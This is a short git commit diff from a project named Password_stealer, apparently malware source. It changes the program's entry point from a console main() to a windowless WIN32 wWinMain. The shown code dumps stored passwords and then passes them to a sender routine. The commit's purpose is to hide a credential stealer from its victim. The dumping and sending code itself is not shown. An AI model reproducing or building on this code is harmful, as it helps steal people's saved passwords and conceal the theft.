0f084c6bcb41bf87e661e5126e06a8f285270d08
Black-Frost <vovantiendung2001@gmail.com>
2021-02-02 00:47:22 +0700

    Change app type to WIN32

--- Password_stealer/Main.cpp
+++ Password_stealer/Main.cpp
@@ -1,8 +1,8 @@
 #include "Main.h"
 
 
-//int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
-int main()
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
+//int main()
 {
 	string dbPath = Dumper::dumpPassword();
 	Sender::sendPasswords(dbPath);
